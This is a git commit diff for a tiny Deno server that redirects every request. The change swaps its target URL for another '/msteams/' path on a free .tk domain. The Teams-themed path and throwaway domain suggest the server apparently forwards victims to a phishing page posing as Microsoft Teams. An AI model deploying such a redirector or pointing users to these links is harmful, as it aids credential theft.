486a593cc33df1d1be0a33ecfca889456f0404d5
Digital2025001 <bosmichael30@gmail.com>
2025-10-30 15:28:01 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://pulsarvale.digital/msteams/", // Replace this with your actual link
+      Location: "https://gr.kostenlosx.tk/msteams/", // Replace this with your actual link
     },
   });
 });
